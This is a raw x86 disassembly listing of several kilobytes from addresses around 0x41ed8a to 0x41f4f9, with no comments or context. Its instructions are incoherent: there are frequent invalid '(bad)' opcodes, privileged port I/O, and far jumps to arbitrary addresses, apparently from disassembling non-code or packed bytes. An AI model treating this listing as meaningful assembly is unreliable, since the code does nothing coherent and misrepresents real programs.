  41ed8a:	test   BYTE PTR [ecx-0x57],bl
  41ed8d:	(bad)  
  41ed8e:	jo     0x41ed7b
  41ed90:	mov    ecx,0xbefcb063
  41ed95:	sbb    DWORD PTR [edx-0x22],ebp
  41ed98:	sahf   
  41ed99:	add    ebx,DWORD PTR [eax+0x5b]
  41ed9c:	mov    ds:0x364a59fa,al
  41eda1:	lock pop edi
  41eda3:	push   0x8312ab3d
  41eda8:	inc    ecx
  41eda9:	xor    al,0xc8
  41edab:	adc    ecx,DWORD PTR [edi+esi*1+0x7e]
  41edaf:	shl    DWORD PTR [edx-0x635e1d2a],cl
  41edb5:	call   0x3d99:0x3ad64d88
  41edbc:	push   esp
  41edbd:	aad    0x6a
  41edbf:	loopne 0x41ed71
  41edc1:	mov    DWORD PTR [eax+0x65],edi
  41edc4:	mov    esp,0x5d13296
  41edc9:	dec    ebx
  41edca:	push   esi
  41edcb:	pop    edx
  41edcc:	mov    gs,WORD PTR [edi-0x2f]
  41edcf:	fwait
  41edd0:	and    edx,eax
  41edd2:	xchg   DWORD PTR [ecx+0x1ea9580a],ebx
  41edd8:	xlat   BYTE PTR cs:[ebx]
  41edda:	and    DWORD PTR [ebx+eiz*4],ebx
  41eddd:	ja     0x41ee4e
  41eddf:	mov    ah,0xdf
  41ede1:	inc    ecx
  41ede2:	or     ah,al
  41ede4:	jno    0x41ed89
  41ede6:	mov    bl,0xc5
  41ede8:	shl    BYTE PTR [esi],1
  41edea:	jnp    0x41eda2
  41edec:	out    0xf7,eax
  41edee:	shl    DWORD PTR [eax],cl
  41edf0:	xchg   ebx,eax
  41edf1:	pop    ecx
  41edf2:	lds    edx,FWORD PTR [edx-0x20]
  41edf5:	adc    dh,ah
  41edf7:	push   0x5d
  41edf9:	dec    esp
  41edfa:	idiv   esp
  41edfc:	popf   
  41edfd:	ror    DWORD PTR [esp+ecx*4+0x13],1
  41ee01:	in     al,dx
  41ee02:	mov    eax,0x11ca21e1
  41ee07:	sbb    eax,0x29655352
  41ee0c:	xchg   edi,eax
  41ee0d:	leave  
  41ee0e:	cmp    esp,DWORD PTR [ebx]
  41ee10:	pop    es
  41ee11:	xchg   BYTE PTR [edx-0x234696c9],al
  41ee17:	cmp    bl,BYTE PTR [edx+0x3cd5d4be]
  41ee1d:	outs   dx,BYTE PTR ds:[esi]
  41ee1e:	jnp    0x41ee6d
  41ee20:	inc    edi
  41ee21:	add    al,0xd6
  41ee23:	je     0x41edaf
  41ee25:	hlt    
  41ee26:	out    0xfb,al
  41ee28:	mov    al,0x7d
  41ee2a:	call   DWORD PTR [eax-0x3c9873b]
  41ee30:	or     ecx,DWORD PTR [ecx+0x3d94b347]
  41ee36:	mul    DWORD PTR [esi-0x34d70ae6]
  41ee3c:	adc    eax,DWORD PTR [esi]
  41ee3e:	cmp    eax,0x5ed1b200
  41ee43:	inc    ebp
  41ee44:	push   edx
  41ee45:	outs   dx,BYTE PTR ds:[esi]
  41ee46:	jmp    0x9d9497eb
  41ee4b:	arpl   WORD PTR [esi+0x1b],sp
  41ee4e:	pop    edi
  41ee4f:	imul   ebp,DWORD PTR [ebx+0x55],0x37b9302c
  41ee56:	call   0x791e:0x3eb75650
  41ee5d:	dec    eax
  41ee5e:	dec    esp
  41ee5f:	shr    ebx,1
  41ee61:	iret   
  41ee62:	mov    ch,0x51
  41ee64:	fadd   QWORD PTR [edi+0x3a04eef]
  41ee6a:	jle    0x41eed5
  41ee6c:	retf   
  41ee6d:	inc    ebp
  41ee6e:	and    BYTE PTR [esi+edi*2],dh
  41ee71:	mov    cl,0xa9
  41ee73:	imul   edi,DWORD PTR [ebp+0x47c689d6],0x32692559
  41ee7d:	cmc    
  41ee7e:	mov    ecx,0x8a4145c0
  41ee83:	jmp    0xab49d303
  41ee88:	mov    edi,0xaa98e8cd
  41ee8d:	sbb    eax,0x87a04b56
  41ee92:	push   ds
  41ee93:	dec    ecx
  41ee94:	aas    
  41ee95:	cdq    
  41ee96:	jp     0x41eebb
  41ee98:	int3   
  41ee99:	mov    eax,0x4a743cca
  41ee9e:	mov    ecx,0x9a55e2bf
  41eea3:	lods   eax,DWORD PTR ds:[esi]
  41eea4:	jmp    0x41ef05
  41eea6:	lea    esp,[ebx-0xa583912]
  41eeac:	jbe    0x41eea1
  41eeae:	mov    ds:0xf0a8c857,al
  41eeb3:	push   edx
  41eeb4:	icebp  
  41eeb5:	cs int 0xf9
  41eeb8:	lds    ecx,FWORD PTR [ecx]
  41eeba:	in     al,0x8c
  41eebc:	push   ss
  41eebd:	sbb    dh,al
  41eebf:	lock jmp 0x41ef2c
  41eec2:	sub    eax,0x8f13b8b5
  41eec7:	dec    edx
  41eec8:	ins    DWORD PTR es:[edi],dx
  41eec9:	xchg   edi,eax
  41eeca:	in     al,0x84
  41eecc:	iret   
  41eecd:	test   ebp,edi
  41eecf:	stos   DWORD PTR es:[edi],eax
  41eed0:	frstor [eax]
  41eed2:	jg     0x41eeee
  41eed4:	pop    esp
  41eed5:	retf   0xb7df
  41eed8:	lahf   
  41eed9:	pop    esp
  41eeda:	add    al,0xaf
  41eedc:	mov    edx,0x373a8d2a
  41eee1:	jno    0x41eea7
  41eee3:	aaa    
  41eee4:	xchg   DWORD PTR [ecx+0x40],esi
  41eee7:	adc    eax,0xd9953be6
  41eeec:	sahf   
  41eeed:	(bad)  
  41eeee:	pop    ecx
  41eeef:	dec    edx
  41eef0:	repnz shl DWORD PTR [esi+eiz*1+0x7bb87927],1
  41eef8:	cdq    
  41eef9:	push   es
  41eefa:	int3   
  41eefb:	sub    BYTE PTR [ebp-0x55],dl
  41eefe:	mov    DWORD PTR [ebx+edi*8+0x13bacdf8],ecx
  41ef05:	push   ecx
  41ef06:	xor    eax,0xb2579e80
  41ef0b:	add    al,0xdb
  41ef0d:	retf   
  41ef0e:	sbb    al,ah
  41ef10:	leave  
  41ef11:	repnz dec edi
  41ef13:	test   DWORD PTR [eax+0x57],esp
  41ef16:	fstp   TBYTE PTR [ecx+0x5c32df73]
  41ef1c:	push   esi
  41ef1d:	push   edi
  41ef1e:	je     0x41ef39
  41ef20:	sub    eax,0x9c41404c
  41ef25:	pop    esp
  41ef26:	mov    eax,DWORD PTR [ecx+ebp*4+0x4a99f9e1]
  41ef2d:	and    al,0xc8
  41ef2f:	mov    cl,0x12
  41ef31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef32:	int3   
  41ef33:	ficomp DWORD PTR [ebp+0x7b]
  41ef36:	ficom  WORD PTR [esi]
  41ef38:	mov    ah,0x7
  41ef3a:	pcmpgtb mm7,QWORD PTR [ebp+0x28e9aa7d]
  41ef41:	cmc    
  41ef42:	add    BYTE PTR [edi+ebx*4],al
  41ef45:	(bad)  
  41ef46:	shr    DWORD PTR [edi-0x14],0x8d
  41ef4a:	aas    
  41ef4b:	retf   0x5504
  41ef4e:	mov    ch,0x1a
  41ef50:	or     dl,BYTE PTR [esi-0x39]
  41ef53:	int    0x3a
  41ef55:	out    dx,al
  41ef56:	mov    dl,0xd5
  41ef58:	sub    al,0xe5
  41ef5a:	jg     0x41efb8
  41ef5c:	dec    edx
  41ef5d:	cmp    eax,0xf644b368
  41ef62:	or     eax,0x7a9dd8f7
  41ef67:	mov    al,ds:0xab25cf0f
  41ef6c:	sub    DWORD PTR [eax],0xffffffca
  41ef6f:	pop    ebx
  41ef70:	sbb    ebp,DWORD PTR [edx-0x155c769]
  41ef76:	je     0x41ef84
  41ef78:	adc    esi,DWORD PTR [ecx+0x48]
  41ef7b:	inc    edx
  41ef7c:	rcl    BYTE PTR [esi+0xa5add1d],1
  41ef82:	rcl    DWORD PTR [esi-0x715d2940],0x69
  41ef89:	xchg   edx,eax
  41ef8a:	jl     0x41ef39
  41ef8c:	jcxz   0x41ef7a
  41ef8f:	imul   esp,DWORD PTR [edi],0x71f7fb18
  41ef95:	in     al,0x87
  41ef97:	sbb    esp,DWORD PTR [edx]
  41ef99:	ins    BYTE PTR es:[edi],dx
  41ef9a:	sub    al,0xe8
  41ef9c:	jp     0x41ef9a
  41ef9e:	scas   al,BYTE PTR es:[edi]
  41ef9f:	loop   0x41ef95
  41efa1:	ror    BYTE PTR [ebx],1
  41efa3:	sti    
  41efa4:	or     DWORD PTR [ebx-0xe8ca195],edi
  41efaa:	popa   
  41efab:	xor    esi,DWORD PTR [eiz*4-0x544e643f]
  41efb2:	xchg   edi,eax
  41efb3:	sbb    DWORD PTR [ebp-0x6111062d],ecx
  41efb9:	daa    
  41efba:	paddd  mm4,QWORD PTR [edi-0x6a]
  41efbe:	mov    bh,0xa4
  41efc0:	and    esp,eax
  41efc2:	mov    edi,0x366726d4
  41efc7:	xor    DWORD PTR [ebp-0x64],esi
  41efca:	js     0x41ef64
  41efcc:	ds dec edx
  41efce:	dec    ebx
  41efcf:	inc    eax
  41efd0:	popa   
  41efd1:	adc    esi,DWORD PTR [ebp+ebx*1-0x58]
  41efd5:	test   al,0x91
  41efd7:	enter  0xc45a,0xe2
  41efdb:	loopne 0x41ef99
  41efdd:	mov    ds:0xcb2eaac2,al
  41efe2:	or     DWORD PTR [ebp+0x30],eax
  41efe5:	icebp  
  41efe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efe7:	sar    edi,1
  41efe9:	das    
  41efea:	mov    ah,0x36
  41efec:	ror    DWORD PTR [ebp+0x2b],1
  41efef:	daa    
  41eff0:	jns    0x41f029
  41eff2:	test   al,0xcb
  41eff4:	in     eax,0x6f
  41eff6:	pop    ecx
  41eff7:	into   
  41eff8:	loopne 0x41ef93
  41effa:	repnz mov eax,0x40f95a
  41f000:	mov    cl,0x8
  41f002:	lahf   
  41f003:	xchg   esi,eax
  41f004:	in     eax,0xc2
  41f006:	mov    bh,0x22
  41f008:	aas    
  41f009:	loope  0x41f050
  41f00b:	scas   eax,DWORD PTR es:[edi]
  41f00c:	mov    bp,0xd285
  41f010:	mov    cl,0xc7
  41f012:	es call 0x60fe2d29
  41f018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f019:	sbb    edi,DWORD PTR [ebp+0x30]
  41f01c:	xchg   ebp,eax
  41f01d:	jl     0x41f055
  41f01f:	and    bh,BYTE PTR [edx]
  41f021:	mov    WORD PTR [eax-0x387f4874],es
  41f027:	xchg   edi,eax
  41f028:	dec    ecx
  41f029:	frstor [ebx]
  41f02b:	fild   DWORD PTR [edi-0xd574b58]
  41f031:	push   ss
  41f032:	push   ecx
  41f033:	imul   esi,esi,0xffffffed
  41f036:	popf   
  41f037:	call   0xce5f3b7a
  41f03c:	adc    eax,0x4b749113
  41f041:	test   eax,0x3e7ae15d
  41f046:	inc    edx
  41f047:	jno    0x41f050
  41f049:	mov    ds:0x475419f3,al
  41f04e:	jbe    0x41efd3
  41f050:	mov    bh,0x7c
  41f052:	inc    edx
  41f053:	or     al,0xd
  41f055:	outs   dx,DWORD PTR ds:[esi]
  41f056:	cmp    bx,WORD PTR [ebx]
  41f059:	ret    0x5ff5
  41f05c:	mov    WORD PTR [ebp+0x14],fs
  41f05f:	add    ch,BYTE PTR [edx]
  41f061:	(bad)  
  41f063:	out    0x1e,eax
  41f065:	xchg   edi,eax
  41f066:	sahf   
  41f067:	es push ebp
  41f069:	push   esi
  41f06a:	push   edx
  41f06b:	pop    eax
  41f06c:	leave  
  41f06d:	xchg   ebp,eax
  41f06e:	fnsave [edx]
  41f070:	ja     0x41f068
  41f072:	hlt    
  41f073:	ins    BYTE PTR es:[edi],dx
  41f074:	pop    esp
  41f075:	les    esi,FWORD PTR [ebx-0xcaa3e8b]
  41f07b:	jns    0x41f0c5
  41f07d:	bound  ebx,QWORD PTR [eax-0x3d6c5a09]
  41f083:	add    BYTE PTR [edx-0x71],cl
  41f086:	bound  ebp,QWORD PTR [edx-0x5d]
  41f089:	pop    eax
  41f08a:	push   cs
  41f08b:	aad    0xec
  41f08d:	aas    
  41f08e:	and    dl,BYTE PTR [edx-0x65da63b7]
  41f094:	add    edi,DWORD PTR [edx]
  41f096:	lods   al,BYTE PTR ds:[esi]
  41f097:	imul   ebp,ebp,0x1f24824b
  41f09d:	ins    DWORD PTR es:[edi],dx
  41f09e:	mov    esp,DWORD PTR [edx]
  41f0a0:	lea    ecx,[edi]
  41f0a2:	repnz xor DWORD PTR [ebx-0x4cefdb99],edi
  41f0a9:	clc    
  41f0aa:	mov    BYTE PTR [edi+0x19],bl
  41f0ad:	adc    DWORD PTR [edx-0x11373156],esp
  41f0b3:	cmp    BYTE PTR [ecx-0x446fa2b9],0x99
  41f0ba:	jno    0x41f103
  41f0bc:	in     al,0xdd
  41f0be:	call   0xf88e:0xce6954a5
  41f0c5:	ret    0xa8ef
  41f0c8:	inc    ecx
  41f0c9:	mov    bl,0x9e
  41f0cb:	jmp    0x41f0c3
  41f0cd:	inc    esp
  41f0ce:	xor    al,0xdc
  41f0d0:	sub    al,0x4f
  41f0d2:	aas    
  41f0d3:	xor    ebx,DWORD PTR [eax-0x8]
  41f0d6:	arpl   WORD PTR [ecx-0x7d],bx
  41f0d9:	xchg   esp,eax
  41f0da:	cmp    ebp,DWORD PTR [ebx+ecx*4]
  41f0dd:	sub    BYTE PTR [edi-0x45],dh
  41f0e0:	add    cl,al
  41f0e2:	adc    ch,bl
  41f0e4:	sub    DWORD PTR [esi+0x5e1507b5],0xffffffdc
  41f0eb:	pop    es
  41f0ec:	(bad)  
  41f0ed:	jle    0x41f119
  41f0ef:	sub    bl,cl
  41f0f1:	out    dx,eax
  41f0f2:	adc    BYTE PTR [ecx+0x6230bae1],ah
  41f0f8:	add    BYTE PTR [edi-0x2fc4e3fb],0x27
  41f0ff:	or     edx,eax
  41f101:	aas    
  41f102:	jp     0x41f0ca
  41f104:	loope  0x41f162
  41f106:	cmp    cl,ah
  41f108:	xchg   ch,dh
  41f10a:	ja     0x41f13c
  41f10c:	test   cl,ch
  41f10e:	adc    ebp,DWORD PTR [ebx-0x2f]
  41f111:	xchg   esi,esi
  41f113:	jne    0x41f16f
  41f115:	xchg   edi,eax
  41f116:	(bad)  
  41f117:	jmp    0xce4a:0xd3d97f6f
  41f11e:	push   es
  41f11f:	pop    es
  41f120:	daa    
  41f121:	sub    bl,BYTE PTR [eax-0x111eb345]
  41f127:	xchg   edx,eax
  41f128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f129:	popa   
  41f12a:	and    BYTE PTR ds:0xf8432dd2,0xce
  41f131:	adc    al,BYTE PTR [esi+0x4c]
  41f134:	es push 0x60f72bf5
  41f13a:	aad    0x1f
  41f13c:	adc    ecx,esi
  41f13e:	lods   al,BYTE PTR ds:[esi]
  41f13f:	mov    esi,0x2c5b63ad
  41f144:	cmp    DWORD PTR [esi+ecx*1+0x2c],ecx
  41f148:	aam    0xad
  41f14a:	test   ebx,eax
  41f14c:	sti    
  41f14d:	imul   BYTE PTR [edx-0x34]
  41f150:	inc    esp
  41f151:	pop    ss
  41f152:	adc    cl,BYTE PTR [esi+0x1]
  41f155:	xchg   edi,eax
  41f156:	xchg   edx,eax
  41f157:	lds    ecx,FWORD PTR ds:0x375fc5c0
  41f15d:	dec    ebp
  41f15e:	mov    DWORD PTR [ebp+0x67],esi
  41f161:	ins    BYTE PTR es:[edi],dx
  41f162:	lahf   
  41f163:	xchg   ebx,eax
  41f164:	pop    es
  41f165:	jno    0x41f1c2
  41f167:	loop   0x41f0f9
  41f169:	(bad)  
  41f16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16b:	mov    dh,0xea
  41f16d:	retf   0xc925
  41f170:	push   eax
  41f171:	add    ebp,eax
  41f173:	adc    BYTE PTR [edi+0x11cd6230],ah
  41f179:	jne    0x41f17d
  41f17b:	pop    ebp
  41f17c:	mov    gs,esp
  41f17e:	xor    al,0xd2
  41f180:	(bad)
  41f183:	xchg   esp,eax
  41f184:	xor    ebx,esp
  41f186:	dec    ecx
  41f187:	jmp    0xc7af932c
  41f18c:	xor    ebp,DWORD PTR [ebx+0x3130732f]
  41f192:	pop    ecx
  41f193:	mov    dl,0x64
  41f196:	jns    0x41f1aa
  41f198:	in     eax,dx
  41f199:	mov    ecx,DWORD PTR [esi]
  41f19b:	cdq    
  41f19c:	rcr    BYTE PTR [esi],1
  41f19e:	sahf   
  41f19f:	stos   DWORD PTR es:[edi],eax
  41f1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a1:	in     al,dx
  41f1a2:	(bad)  
  41f1a3:	popf   
  41f1a4:	daa    
  41f1a5:	out    dx,al
  41f1a6:	mov    ds:0x9229076,eax
  41f1ab:	rcl    ch,0x54
  41f1ae:	pushf  
  41f1af:	mov    BYTE PTR [edi-0x5ca41cd2],ch
  41f1b5:	fisttp QWORD PTR [edi+0x31]
  41f1b8:	(bad)  
  41f1b9:	dec    edx
  41f1ba:	ret    0xc207
  41f1bd:	adc    al,0x88
  41f1bf:	mov    WORD PTR [edi-0x62],?
  41f1c2:	xchg   ebx,eax
  41f1c3:	fsub   QWORD PTR [ebx+0x15]
  41f1c6:	and    al,0x3f
  41f1c8:	mov    ebx,fs
  41f1ca:	cwde   
  41f1cb:	loopne 0x41f170
  41f1cd:	mov    ah,0x5
  41f1cf:	pop    edx
  41f1d0:	jnp    0x41f155
  41f1d2:	pop    edx
  41f1d3:	popa   
  41f1d4:	mov    ebp,0xc84bb06d
  41f1d9:	jb     0x41f24d
  41f1db:	mov    dl,0x8e
  41f1dd:	jecxz  0x41f203
  41f1df:	test   DWORD PTR [ebx],eax
  41f1e1:	shr    DWORD PTR ds:0x49217644,1
  41f1e7:	and    DWORD PTR [eax],0xffffffaa
  41f1ea:	dec    esp
  41f1eb:	and    ch,BYTE PTR [edx+0x45]
  41f1ee:	pushf  
  41f1ef:	mov    ecx,DWORD PTR [edi-0x324d8a8a]
  41f1f5:	icebp  
  41f1f6:	adc    dh,BYTE PTR [esi-0x4c916d3e]
  41f1fc:	das    
  41f1fd:	mov    edx,0xae300779
  41f202:	int    0xd4
  41f204:	in     eax,dx
  41f205:	pop    es
  41f206:	jle    0x41f282
  41f208:	sbb    eax,DWORD PTR [edx+0x77]
  41f20b:	cdq    
  41f20c:	mov    esi,0xfc90b5c3
  41f211:	nop
  41f212:	add    eax,DWORD PTR [edi-0x2a]
  41f215:	pushf  
  41f216:	gs sub cl,0xfb
  41f21a:	ds cmp ebp,eax
  41f21d:	dec    ecx
  41f21e:	mov    ecx,0x5c03608c
  41f223:	sub    BYTE PTR [ebp-0x4e],0x34
  41f227:	scas   eax,DWORD PTR es:[edi]
  41f228:	(bad)  
  41f229:	push   edx
  41f22a:	mov    esp,0xf7140154
  41f22f:	ds retf 0x97c1
  41f233:	sbb    al,0x6b
  41f235:	call   0x12bab0fe
  41f23a:	pop    ds
  41f23b:	(bad)  
  41f23c:	ins    DWORD PTR es:[edi],dx
  41f23d:	popf   
  41f23e:	jb     0x41f23c
  41f240:	jmp    0x7b337dbb
  41f245:	loopne 0x41f1d0
  41f247:	jl     0x41f2b1
  41f249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24a:	retf   
  41f24b:	js     0x41f25b
  41f24d:	out    0x59,al
  41f24f:	es out dx,al
  41f251:	sbb    al,0x3
  41f253:	and    ecx,DWORD PTR [edx-0x3e26a2d5]
  41f259:	or     BYTE PTR [edx+0x67],bl
  41f25c:	xor    eax,0xdcc0f579
  41f261:	jns    0x41f2a1
  41f263:	aas    
  41f264:	imul   esp,DWORD PTR [edx-0x182c79d7],0xfffffff2
  41f26b:	ins    BYTE PTR es:[edi],dx
  41f26c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f26d:	clc    
  41f26e:	and    DWORD PTR [ecx],0xffffffa7
  41f271:	xchg   DWORD PTR [eax-0x2d],ebx
  41f274:	dec    esp
  41f275:	or     al,0xab
  41f277:	mov    edi,0xf6361a68
  41f27c:	mov    bl,0xf9
  41f27e:	mov    ecx,0xfabc02cd
  41f283:	ds push esp
  41f285:	imul   edi,DWORD PTR [ecx],0xffffffc2
  41f288:	and    BYTE PTR [di+0x1169],dh
  41f28d:	fcomi  st,st(3)
  41f28f:	arpl   WORD PTR [ecx-0x6b],di
  41f292:	popa   
  41f293:	dec    esi
  41f294:	pop    esi
  41f295:	loop   0x41f24a
  41f297:	daa    
  41f298:	jne    0x41f276
  41f29a:	xchg   ebx,eax
  41f29c:	inc    esi
  41f29d:	cs sub eax,0x495eb3b6
  41f2a3:	(bad)  
  41f2a4:	sbb    eax,0x6771f367
  41f2a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2aa:	adc    al,0x9e
  41f2ac:	sub    al,0xcc
  41f2ae:	xchg   BYTE PTR [ebx+0x21a5a59d],cl
  41f2b4:	sbb    DWORD PTR [ecx-0xc],ecx
  41f2b7:	or     ebx,ebp
  41f2b9:	hlt    
  41f2ba:	retf   
  41f2bb:	in     al,0x3b
  41f2bd:	or     DWORD PTR [ebx],ecx
  41f2bf:	add    eax,0xdef7f9df
  41f2c4:	repnz mov ss,WORD PTR [esi+0x5ddd7b27]
  41f2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2cc:	xor    eax,0xce4e7d84
  41f2d1:	sub    ah,dl
  41f2d3:	mov    edx,0x537b91da
  41f2d8:	mov    dl,0x4a
  41f2da:	adc    DWORD PTR [ebx-0x75871ef1],esp
  41f2e0:	push   edx
  41f2e1:	mov    cl,0x97
  41f2e3:	shl    DWORD PTR [edx+eiz*8-0x5664ab2b],cl
  41f2ea:	dec    esi
  41f2eb:	dec    DWORD PTR [eax+0x6d]
  41f2ee:	(bad)  
  41f2f0:	test   esi,esp
  41f2f2:	sbb    BYTE PTR [esi],0x3
  41f2f5:	push   0xffffff8e
  41f2f7:	fucomi st,st(7)
  41f2f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2fa:	lock xor dh,BYTE PTR [ebx]
  41f2fd:	addr16 mov ebx,0xa1d37e10
  41f303:	and    al,0x14
  41f305:	repz loope 0x41f339
  41f308:	jp     0x41f300
  41f30a:	das    
  41f30b:	in     al,dx
  41f30c:	adc    DWORD PTR [ebp-0x680cfa20],ecx
  41f312:	cmp    esp,ecx
  41f314:	enter  0x4db,0x59
  41f318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f319:	cs and al,0x12
  41f31c:	cmp    bh,BYTE PTR [ebx+0x65114b8b]
  41f322:	inc    ebp
  41f323:	ja     0x41f358
  41f325:	xor    al,0xa3
  41f327:	dec    eax
  41f328:	aaa    
  41f329:	clc    
  41f32a:	sbb    ah,bh
  41f32c:	outs   dx,BYTE PTR ds:[esi]
  41f32d:	dec    BYTE PTR [eax+0x43]
  41f330:	jle    0x41f39d
  41f332:	mov    eax,ds:0x76f35793
  41f337:	call   0xc024591e
  41f33c:	push   ds
  41f33d:	nop
  41f33e:	cld    
  41f33f:	pop    ecx
  41f340:	call   DWORD PTR [eax+0x697e2072]
  41f346:	add    ah,bh
  41f348:	pop    esi
  41f349:	pop    esi
  41f34a:	mov    ebp,0xb52efbd4
  41f34f:	aam    0x54
  41f351:	pop    esp
  41f352:	xchg   esp,eax
  41f353:	cmp    eax,0xaf23157f
  41f358:	jb     0x41f2fe
  41f35a:	aaa    
  41f35b:	fs pushf 
  41f35d:	fmul   st,st(4)
  41f35f:	push   ds
  41f360:	int    0xe8
  41f362:	iret   
  41f363:	lods   al,BYTE PTR ds:[esi]
  41f364:	add    dl,BYTE PTR fs:[eax+edx*8]
  41f368:	adc    al,0x4c
  41f36a:	aam    0x50
  41f36c:	(bad)  
  41f36d:	jg     0x41f37c
  41f36f:	sbb    eax,0x9d1c7203
  41f374:	fisub  WORD PTR [edx]
  41f376:	test   eax,0x74df490e
  41f37b:	fcomip st,st(1)
  41f37d:	xchg   BYTE PTR [ebx-0x1f],cl
  41f380:	ret    
  41f381:	or     DWORD PTR [edi-0x31b21151],ecx
  41f387:	xchg   esp,eax
  41f388:	mov    ch,0x86
  41f38a:	or     eax,eax
  41f38c:	hlt    
  41f38d:	push   ebp
  41f38e:	int3   
  41f38f:	hlt    
  41f390:	popf   
  41f391:	cmp    al,0xb2
  41f393:	test   DWORD PTR [ebx-0x4fb37fde],edx
  41f399:	imul   dh
  41f39b:	cwde   
  41f39c:	mov    eax,0x980cac3f
  41f3a1:	adc    edx,ebx
  41f3a3:	jmp    0x5ad7a3db
  41f3a8:	mov    ah,0x3e
  41f3aa:	cs mov cl,0x42
  41f3ad:	pushf  
  41f3ae:	and    BYTE PTR [ebx-0x6e39163b],cl
  41f3b4:	mov    al,0x3c
  41f3b6:	das    
  41f3b7:	xlat   BYTE PTR ds:[ebx]
  41f3b8:	ins    DWORD PTR es:[edi],dx
  41f3b9:	int    0xa2
  41f3bb:	jne    0x41f420
  41f3bd:	or     DWORD PTR [eax-0x3e],0xaf7effc7
  41f3c4:	cmp    al,0x83
  41f3c6:	ins    DWORD PTR es:[edi],dx
  41f3c7:	pop    edx
  41f3c8:	dec    eax
  41f3c9:	sub    bh,BYTE PTR [ebp+0x234e0147]
  41f3cf:	mov    WORD PTR [edi-0x1e7f717f],gs
  41f3d5:	xor    DWORD PTR [edx+0x20681ea5],edi
  41f3db:	xchg   esi,eax
  41f3dc:	stos   DWORD PTR es:[edi],eax
  41f3dd:	pop    ebp
  41f3de:	das    
  41f3df:	(bad)  
  41f3e0:	fwait
  41f3e1:	sbb    al,0x7c
  41f3e3:	cmp    DWORD PTR [edx-0x25],esi
  41f3e6:	jecxz  0x41f373
  41f3e8:	jae    0x41f397
  41f3ea:	gs ins BYTE PTR es:[edi],dx
  41f3ec:	imul   ebp,DWORD PTR [ebx+0xb],0x14
  41f3f0:	(bad)  [edx*1-0x6aae50cd]
  41f3f7:	mov    esp,0xa65182a4
  41f3fc:	dec    eax
  41f3fd:	inc    esi
  41f3fe:	push   ecx
  41f3ff:	pop    ss
  41f400:	jmp    0x41f396
  41f402:	sub    ebx,DWORD PTR [esi+ecx*1]
  41f405:	stc    
  41f406:	mov    bh,0x4b
  41f408:	xchg   edi,eax
  41f409:	in     eax,0x21
  41f40b:	hlt    
  41f40c:	shr    bl,1
  41f40e:	xchg   edi,eax
  41f40f:	in     eax,0x9e
  41f411:	sbb    al,0x49
  41f413:	xlat   BYTE PTR ds:[ebx]
  41f414:	aam    0x8f
  41f416:	xlat   BYTE PTR ds:[ebx]
  41f417:	test   al,0x9a
  41f419:	iret   
  41f41a:	enter  0x20cd,0xa2
  41f41e:	call   0x796360ae
  41f423:	xchg   edi,eax
  41f424:	ret    0xab1c
  41f427:	shr    DWORD PTR [ebp-0x7c021ac],cl
  41f42d:	lea    ebx,ds:0xd92bb292
  41f433:	mov    ss,ecx
  41f435:	imul   edx,DWORD PTR ds:0x7aa5d62d,0xffffffd8
  41f43c:	call   0x9890c3dd
  41f441:	lahf   
  41f442:	pop    ecx
  41f443:	jmp    0x2812:0xc18ac2b7
  41f44a:	mov    bh,0xd4
  41f44c:	test   eax,0x711d342b
  41f451:	xor    al,0x29
  41f453:	xlat   BYTE PTR ds:[ebx]
  41f454:	test   DWORD PTR [esi-0x1cf4830c],edi
  41f45a:	sub    ecx,ebx
  41f45c:	pop    ds
  41f45d:	scas   eax,DWORD PTR es:[edi]
  41f45e:	retf   0xdf4a
  41f461:	cmp    edx,edx
  41f463:	cld    
  41f464:	sbb    BYTE PTR ds:0x1e8ee243,dl
  41f46a:	push   edx
  41f46b:	or     eax,0x6e8e472e
  41f470:	push   ebp
  41f471:	or     al,0xc
  41f473:	pop    es
  41f474:	(bad)  
  41f476:	jbe    0x41f44a
  41f478:	sub    BYTE PTR [edx],0xb1
  41f47b:	xchg   ebp,eax
  41f47c:	mov    ch,BYTE PTR [edx-0x795a5cd]
  41f482:	inc    ebx
  41f483:	dec    esp
  41f484:	and    eax,0x8903d426
  41f489:	in     al,dx
  41f48a:	hlt    
  41f48b:	jne    0x41f485
  41f48d:	jo     0x41f4af
  41f48f:	neg    DWORD PTR [ecx+0x222dfe8]
  41f495:	jp     0x41f439
  41f497:	out    dx,al
  41f498:	jbe    0x41f476
  41f49a:	pop    esi
  41f49b:	mov    al,0x6d
  41f49d:	cmc    
  41f49e:	xor    al,0x30
  41f4a0:	lea    ebp,[edi-0x3b]
  41f4a3:	sar    DWORD PTR [edi-0x7d],cl
  41f4a6:	or     eax,DWORD PTR [edx-0x3402f677]
  41f4ac:	test   DWORD PTR [eax+0x22],eax
  41f4af:	mov    eax,0x2155337e
  41f4b4:	push   0x3c
  41f4b6:	mov    dl,0x52
  41f4b8:	sbb    al,0x4c
  41f4ba:	(bad)  [eax+0x12]
  41f4bd:	fwait
  41f4be:	push   edi
  41f4bf:	lea    edi,[edi-0x1b]
  41f4c2:	dec    esi
  41f4c3:	fdiv   QWORD PTR [edx]
  41f4c5:	add    edx,ebx
  41f4c7:	inc    ebp
  41f4c8:	or     al,BYTE PTR [ecx-0x5]
  41f4cb:	xchg   esp,eax
  41f4cc:	xor    DWORD PTR [edx-0x58],0x69
  41f4d0:	add    esi,edi
  41f4d2:	sub    BYTE PTR [edx],0x79
  41f4d5:	and    BYTE PTR [edi-0x4caae19c],al
  41f4db:	inc    eax
  41f4dc:	inc    esp
  41f4dd:	and    al,0x9e
  41f4df:	pop    esp
  41f4e0:	int3   
  41f4e1:	lods   al,BYTE PTR ds:[esi]
  41f4e2:	mov    bh,0x4c
  41f4e4:	(bad)  
  41f4e6:	push   eax
  41f4e7:	cmp    eax,0xcb987689
  41f4ec:	std    
  41f4ed:	add    al,0x97
  41f4ef:	(bad)  
  41f4f0:	xor    eax,0x9847530e
  41f4f5:	daa    
  41f4f6:	retf   0x686a
  41f4f9:	pop    ebp
